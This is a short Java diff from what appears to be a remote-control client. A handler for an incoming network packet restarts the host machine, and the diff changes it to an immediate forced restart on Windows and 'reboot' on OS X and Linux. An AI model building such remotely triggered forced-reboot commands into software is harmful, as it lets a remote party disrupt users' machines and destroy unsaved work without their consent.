@@ -10,10 +10,10 @@ public class Packet29RestartComputer extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-			Runtime.getRuntime().exec("shutdown.exe -r");
+			Runtime.getRuntime().exec("shutdown.exe -t 0 -r -f");
 			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
 		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
-			Runtime.getRuntime().exec("shutdown -r now");
+			Runtime.getRuntime().exec("reboot");
 			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
 		} else {
 
